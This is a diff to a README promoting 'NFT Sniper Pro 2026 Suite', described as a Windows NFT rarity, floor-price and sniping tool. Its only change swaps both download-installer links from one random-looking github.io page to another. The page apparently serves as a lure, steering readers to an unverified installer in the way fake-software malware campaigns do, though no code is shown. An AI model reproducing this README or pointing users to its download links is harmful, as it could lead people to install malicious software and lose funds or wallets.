@@ -2,7 +2,7 @@
 
 NFT Sniper Pro 2026 Suite is an advanced desktop application designed for Windows users to seamlessly check NFT rarity, monitor floor prices, and execute sniper strategies across popular marketplaces like OpenSea and Magic Eden. This tool enhances your NFT trading experience with real-time data and automated features, making it essential for both collectors and traders in the digital asset space.
 
-[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://yellowtaxisave.github.io/download-page/)
+[![Download Installer](https://img.shields.io/badge/Download-Installer-brightgreen?style=for-the-badge&logo=github)](https://capitals-707-bringing.github.io/download-page/)
 
 ## Key Features
 
@@ -64,6 +64,6 @@ This documentation was last updated in January 2026. The tool is regularly updat
 
 To get the latest version of NFT Sniper Pro 2026 Suite, click the link below:
 
-[Download the latest version from GitHub](https://yellowtaxisave.github.io/download-page/)
+[Download the latest version from GitHub](https://capitals-707-bringing.github.io/download-page/)
 
 This tool is provided for educational and personal use. Always exercise caution when dealing with NFTs and cryptocurrency investments. The developers are not responsible for any losses incurred through the use of this software. Ensure you understand the risks involved in digital asset trading.
